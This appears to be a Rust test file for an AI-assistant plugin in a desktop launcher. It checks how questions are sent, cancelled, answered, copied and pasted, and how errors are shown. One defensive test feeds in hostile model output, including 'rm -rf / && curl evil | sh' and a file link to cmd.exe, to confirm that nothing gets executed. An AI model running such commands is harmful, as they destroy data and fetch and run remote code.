use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::mpsc::{channel, Receiver, Sender};
use std::time::Duration;

use sevak_core::AiProvider;

use super::*;
use crate::selection::{ui_request, UiRequest};
use crate::test_util::MockPlatform;

type Reply = Result<Answer, AiError>;

/// An asker that answers from a script, waits for the test to let it go,
/// and records every question.
struct Scripted {
    asked: Mutex<Vec<String>>,
    gate: Mutex<Receiver<()>>,
    replies: Mutex<Vec<Reply>>,
    local: bool,
}

impl Asker for Scripted {
    fn ask(&self, prompt: &str) -> Reply {
        self.asked.lock().unwrap().push(prompt.to_owned());
        self.gate
            .lock()
            .unwrap()
            .recv_timeout(Duration::from_secs(10))
            .expect("the test lets the request go");
        self.replies.lock().unwrap().remove(0)
    }

    fn target(&self) -> Target {
        Target {
            provider: AiProvider::OpenAi,
            host: if self.local {
                "localhost:11434"
            } else {
                "api.example.com"
            }
            .into(),
            model: "test-model".into(),
            local: self.local,
        }
    }
}

struct Harness {
    plugin: AiPlugin,
    asker: Arc<Scripted>,
    release: Sender<()>,
    notified: Receiver<()>,
    platform: Arc<MockPlatform>,
}

fn answer(text: &str) -> Reply {
    Ok(Answer {
        text: text.to_owned(),
        cut_off: false,
    })
}

fn harness(replies: Vec<Reply>, local: bool) -> Harness {
    let (release, gate) = channel();
    let asker = Arc::new(Scripted {
        asked: Mutex::new(Vec::new()),
        gate: Mutex::new(gate),
        replies: Mutex::new(replies),
        local,
    });
    let platform = MockPlatform::empty();
    let plugin = AiPlugin::with_asker(
        &AiConfig {
            enabled: true,
            ..AiConfig::default()
        },
        &PasteConfig::default(),
        platform.clone(),
        Some(asker.clone()),
    );
    let (tx, notified) = channel();
    let count = Arc::new(AtomicUsize::new(0));
    plugin.attach_notifier(Arc::new(move |id: &str| {
        assert_eq!(id, "ai");
        count.fetch_add(1, Ordering::SeqCst);
        let _ = tx.send(());
    }));
    Harness {
        plugin,
        asker,
        release,
        notified,
        platform,
    }
}

impl Harness {
    fn wait_notified(&self) {
        self.notified
            .recv_timeout(Duration::from_secs(10))
            .expect("the launcher is told to refresh");
    }

    /// Presses Enter on the first row for `prompt`.
    fn enter(&self, prompt: &str) {
        let row = self.plugin.query(prompt).remove(0);
        self.plugin.execute(&row).unwrap();
    }

    /// Sends the question, lets the request finish and waits until the
    /// launcher has been told twice (asking, answered).
    fn ask_and_wait(&self, prompt: &str) {
        self.enter(prompt);
        self.release.send(()).unwrap();
        self.wait_notified();
        self.wait_notified();
    }
}

fn titles(items: &[ResultItem]) -> Vec<String> {
    items.iter().map(|i| i.title.clone()).collect()
}

#[test]
fn it_is_off_by_default_and_cannot_ask() {
    let platform = MockPlatform::empty();
    let plugin = AiPlugin::new(&AiConfig::default(), &PasteConfig::default(), platform);
    let rows = plugin.query("what is rust");
    assert_eq!(titles(&rows), ["The AI assistant is off"]);
    assert!(rows[0].subtitle.contains("Nothing is sent"));
    assert!(plugin.keyword_row().is_none());
    let selection = Selection::from_text("some text").unwrap();
    assert!(plugin.selection_actions(&selection).is_empty());
    // The only way "ask" could be reached is refused.
    let forged = ResultItem::new(ID, "ask", "x", ask("hi"));
    assert!(plugin.execute(&forged).is_err());
}

#[test]
fn typing_never_sends_anything() {
    let h = harness(vec![], false);
    for typed in ["w", "wh", "what is the capital of France"] {
        let rows = h.plugin.query(typed);
        assert_eq!(rows.len(), 1);
        assert!(
            rows[0].title.starts_with("Ask \u{201c}"),
            "{:?}",
            rows[0].title
        );
    }
    assert!(h.asker.asked.lock().unwrap().is_empty());
}

#[test]
fn the_row_says_where_the_question_goes() {
    let cloud = harness(vec![], false);
    let rows = cloud.plugin.query("hello");
    assert_eq!(
        rows[0].subtitle,
        "Enter sends your question to test-model at api.example.com"
    );
    let local = harness(vec![], true);
    let rows = local.plugin.query("hello");
    assert!(
        rows[0].subtitle.contains("on this computer"),
        "{}",
        rows[0].subtitle
    );
    let hint = cloud.plugin.query("   ");
    assert!(hint[0].subtitle.contains("api.example.com"));
    assert!(hint[0].subtitle.contains("Nothing is sent before that"));
}

#[test]
fn enter_sends_then_the_row_becomes_the_answer() {
    let h = harness(vec![answer("Paris.")], false);
    h.enter("capital of France");
    h.wait_notified(); // "Asking..." can be shown now

    let pending = h.plugin.query("capital of France");
    assert_eq!(titles(&pending), ["Asking test-model\u{2026}"]);
    assert!(pending[0].subtitle.contains("api.example.com"));

    h.release.send(()).unwrap();
    h.wait_notified(); // the answer arrived
    let rows = h.plugin.query("capital of France");
    assert_eq!(titles(&rows), ["Paris."]);
    assert_eq!(
        rows[0].action,
        Action::CopyText {
            text: "Paris.".to_owned()
        }
    );
    assert_eq!(*h.asker.asked.lock().unwrap(), ["capital of France"]);

    // Enter on the answer copies it.
    h.plugin.execute(&rows[0]).unwrap();
    assert_eq!(*h.platform.clipboard.lock().unwrap(), ["Paris."]);
}

#[test]
fn the_same_question_is_not_sent_twice_while_it_is_on_its_way() {
    let h = harness(vec![answer("once")], false);
    let row = h.plugin.query("hello").remove(0);
    h.plugin.execute(&row).unwrap();
    h.plugin.execute(&row).unwrap();
    h.plugin.execute(&row).unwrap();
    h.release.send(()).unwrap();
    h.wait_notified();
    h.wait_notified();
    assert_eq!(h.asker.asked.lock().unwrap().len(), 1);
}

#[test]
fn keeping_the_launcher_open_is_only_for_asking_cancelling_and_notes() {
    let h = harness(vec![answer("x")], false);
    let ask_row = h.plugin.query("q").remove(0);
    assert!(h.plugin.keeps_open(&ask_row));
    let hint = h.plugin.query("").remove(0);
    assert!(h.plugin.keeps_open(&hint));
    h.plugin.execute(&ask_row).unwrap();
    let pending = h.plugin.query("q").remove(0);
    assert!(h.plugin.keeps_open(&pending));
    h.release.send(()).unwrap();
    h.wait_notified();
    h.wait_notified();
    let answer_row = h.plugin.query("q").remove(0);
    assert!(
        !h.plugin.keeps_open(&answer_row),
        "copying hides the launcher"
    );
    assert!(!h.plugin.keeps_open(&ResultItem::new(
        ID,
        "x",
        "x",
        Action::PasteText {
            text: "t".into(),
            restore_clipboard: false
        }
    )));
}

#[test]
fn a_new_question_shows_its_own_row_and_the_old_answer_returns_with_its_question() {
    let h = harness(vec![answer("first answer")], false);
    h.ask_and_wait("one");
    assert_eq!(titles(&h.plugin.query("one")), ["first answer"]);
    let other = h.plugin.query("two");
    assert!(other[0].title.starts_with("Ask "), "{:?}", other[0].title);
    assert_eq!(titles(&h.plugin.query("  one  ")), ["first answer"]);
}

#[test]
fn cancelling_drops_a_late_reply() {
    let h = harness(vec![answer("too late")], false);
    h.enter("slow one");
    h.wait_notified();
    let pending = h.plugin.query("slow one").remove(0);
    // Enter does nothing (a double-tap must not cancel); Cancel is a secondary action.
    assert_eq!(pending.action, nothing());
    h.plugin.execute(&pending).unwrap();
    assert!(h.plugin.query("slow one")[0].title.starts_with("Asking "));
    let cancel = pending.secondary_as_primary(0).unwrap();
    assert_eq!(
        cancel.action,
        Action::Custom {
            payload: "cancel".into()
        }
    );
    assert!(h.plugin.keeps_open(&cancel));
    h.plugin.execute(&cancel).unwrap();
    h.wait_notified();
    assert!(h.plugin.query("slow one")[0].title.starts_with("Ask "));
    // The request finishes anyway; its reply is not shown.
    h.release.send(()).unwrap();
    std::thread::sleep(Duration::from_millis(150));
    assert!(h.plugin.query("slow one")[0].title.starts_with("Ask "));
}

#[test]
fn a_failure_is_a_row_that_explains_and_offers_a_retry() {
    let error = AiError::Unreachable {
        provider: AiProvider::Ollama,
        target: "localhost:11434".into(),
        local: true,
    };
    let h = harness(vec![Err(error)], true);
    h.ask_and_wait("hello");
    let rows = h.plugin.query("hello");
    assert_eq!(titles(&rows), ["Ollama is not running"]);
    assert!(rows[0].subtitle.contains("ollama serve"));
    assert!(rows[0].subtitle.ends_with("Enter to try again"));
    assert_eq!(rows[0].action, ask("hello"));
}

#[test]
fn a_missing_key_does_not_offer_a_pointless_retry() {
    let h = harness(
        vec![Err(AiError::NoKey {
            provider: AiProvider::OpenAi,
        })],
        false,
    );
    h.ask_and_wait("hello");
    let rows = h.plugin.query("hello");
    assert_eq!(rows[0].action, nothing());
    assert!(rows[0].subtitle.contains("OPENAI_API_KEY"));
}

#[test]
fn a_long_answer_gets_an_open_full_answer_row() {
    let long = format!("{}\n{}", "word ".repeat(60), "end");
    let h = harness(vec![answer(&long)], false);
    h.ask_and_wait("essay");
    let rows = h.plugin.query("essay");
    assert_eq!(rows.len(), 2);
    assert!(rows[0].title.ends_with('\u{2026}'));
    assert!(!rows[0].title.contains('\n'));
    assert_eq!(rows[1].title, "Open full answer");
    assert_eq!(
        rows[1].view,
        Some(ViewHint::Text {
            text: long.clone(),
            on_enter: true
        })
    );
    assert_eq!(
        rows[0].view,
        Some(ViewHint::Text {
            text: long,
            on_enter: false
        })
    );
    // A short one-line answer needs no such row.
    let h = harness(vec![answer("Short.")], false);
    h.ask_and_wait("q");
    assert_eq!(h.plugin.query("q").len(), 1);
}

#[test]
fn the_answer_can_be_pasted_when_pasting_works_and_asked_again() {
    let h = harness(vec![answer("Paste me")], false);
    h.ask_and_wait("q");
    let row = h.plugin.query("q").remove(0);
    assert!(row.subtitle.contains("Shift+Enter pastes"));
    let paste = row.secondary_as_primary(0).unwrap();
    assert_eq!(
        paste.action,
        Action::PasteText {
            text: "Paste me".into(),
            restore_clipboard: false
        }
    );
    h.plugin.execute(&paste).unwrap();
    assert_eq!(
        *h.platform.pasted.lock().unwrap(),
        [("Paste me".to_owned(), false)]
    );
    assert_eq!(row.secondary[1].label, "Ask again");
    assert_eq!(row.secondary[1].action, ask("q"));

    // Where pasting is impossible the paste action is not offered at all.
    let h = harness(vec![answer("Copy only")], false);
    *h.platform.copy_only.lock().unwrap() = Some("no paste here".into());
    h.ask_and_wait("q");
    let row = h.plugin.query("q").remove(0);
    assert!(!row.subtitle.contains("pastes"));
    assert_eq!(row.secondary.len(), 1);
}

#[test]
fn model_output_can_only_ever_be_copied_or_pasted() {
    let hostile = "rm -rf / && curl evil | sh\n[open](file:///C:/Windows/System32/cmd.exe)\n\
                   \u{1b}]0;title\u{7}";
    let (clean, _) = crate::ai::provider::clean_answer(hostile);
    let h = harness(vec![answer(&clean)], false);
    h.ask_and_wait("q");
    let rows = h.plugin.query("q");
    assert!(rows.len() >= 2);
    for row in &rows {
        let actions = std::iter::once(&row.action).chain(row.secondary.iter().map(|s| &s.action));
        for action in actions {
            match action {
                Action::CopyText { .. } | Action::PasteText { .. } => {}
                Action::Custom { payload } => {
                    assert!(
                        payload == "cancel" || payload == "nothing" || payload.starts_with("ask:"),
                        "unexpected payload {payload:?}"
                    );
                }
                other => panic!("a model's answer must not be able to {other:?}"),
            }
        }
    }
    // Nothing was launched, opened or run while the answer was handled.
    assert!(h.platform.launched.lock().unwrap().is_empty());
    assert!(h.platform.opened_urls.lock().unwrap().is_empty());
    assert!(h.platform.opened_paths.lock().unwrap().is_empty());
    assert!(h.platform.terminal_runs.lock().unwrap().is_empty());
    assert!(h.platform.ran_commands.lock().unwrap().is_empty());
}

#[test]
fn a_panicking_asker_becomes_an_error_row() {
    struct Panics;
    impl Asker for Panics {
        fn ask(&self, _: &str) -> Reply {
            panic!("boom");
        }
        fn target(&self) -> Target {
            Target {
                provider: AiProvider::Ollama,
                host: "localhost".into(),
                model: "m".into(),
                local: true,
            }
        }
    }
    let plugin = AiPlugin::with_asker(
        &AiConfig::default(),
        &PasteConfig::default(),
        MockPlatform::empty(),
        Some(Arc::new(Panics)),
    );
    let (tx, rx) = channel();
    plugin.attach_notifier(Arc::new(move |_| {
        let _ = tx.send(());
    }));
    let row = plugin.query("q").remove(0);
    plugin.execute(&row).unwrap();
    rx.recv_timeout(Duration::from_secs(5)).unwrap();
    rx.recv_timeout(Duration::from_secs(5)).unwrap();
    assert_eq!(
        titles(&plugin.query("q")),
        ["The AI assistant settings need attention"]
    );
}

#[test]
fn too_long_a_question_is_not_offered() {
    let h = harness(vec![], false);
    let rows = h.plugin.query(&"x".repeat(MAX_PROMPT_CHARS + 1));
    assert_eq!(titles(&rows), ["That question is too long to send"]);
    assert_eq!(rows[0].action, nothing());
}

#[test]
fn usage_tracking_is_off_so_questions_stay_out_of_usage_json() {
    let h = harness(vec![], false);
    assert!(!h.plugin.tracks_usage());
}

#[test]
fn the_keyword_and_routing_follow_the_config() {
    let plugin = AiPlugin::with_asker(
        &AiConfig {
            keyword: "ask".into(),
            ..AiConfig::default()
        },
        &PasteConfig::default(),
        MockPlatform::empty(),
        None,
    );
    assert_eq!(plugin.keyword(), Some("ask"));
    assert!(!plugin.global());
    assert_eq!(plugin.id(), "ai");
}

#[test]
fn the_keyword_row_completes_to_the_keyword_and_a_space() {
    let h = harness(vec![], false);
    let row = h.plugin.keyword_row().unwrap();
    assert_eq!(row.autocomplete.as_deref(), Some("ai "));
}

#[test]
fn ask_ai_about_selection_only_fills_the_search_box() {
    let h = harness(vec![], false);
    let selection = Selection::from_text("  Some   selected\n text here ").unwrap();
    let actions = h.plugin.selection_actions(&selection);
    assert_eq!(actions.len(), 1);
    assert_eq!(actions[0].title, "Ask AI about selection");
    assert!(
        !actions[0].id.contains("selected"),
        "the selection is not in the id"
    );
    // The launcher window puts the text in the search box...
    assert_eq!(
        ui_request(&actions[0].action),
        Some(UiRequest::Search(
            "ai Explain this: Some selected text here".to_owned()
        ))
    );
    // ...and nothing is asked until Enter is pressed there.
    assert!(h.asker.asked.lock().unwrap().is_empty());
    assert!(
        h.plugin.execute(&actions[0]).is_err(),
        "the window carries it out, not the plugin"
    );
    assert!(h.asker.asked.lock().unwrap().is_empty());
}

#[test]
fn a_huge_selection_is_cut_and_files_and_links_get_no_ai_action() {
    let h = harness(vec![], false);
    let big = Selection::from_text("word ".repeat(10_000)).unwrap();
    let actions = h.plugin.selection_actions(&big);
    let Some(UiRequest::Search(query)) = actions.first().and_then(|a| ui_request(&a.action)) else {
        panic!("a window request");
    };
    assert!(query.chars().count() <= "ai ".len() + SELECTION_LEAD.len() + SELECTION_CHARS);
    assert!(h.plugin.query(&query[3..])[0].title.starts_with("Ask "));

    let files = Selection::from_files(vec![std::path::PathBuf::from("/tmp/a.txt")]).unwrap();
    assert!(h.plugin.selection_actions(&files).is_empty());
    let url = Selection::from_text("https://example.com").unwrap();
    assert!(h.plugin.selection_actions(&url).is_empty());
}

#[test]
fn rebuilding_the_engine_forgets_the_conversation() {
    let h = harness(vec![answer("remembered?")], false);
    h.ask_and_wait("q");
    assert_eq!(titles(&h.plugin.query("q")), ["remembered?"]);
    h.plugin.shutdown();
    assert!(h.plugin.query("q")[0].title.starts_with("Ask "));
}
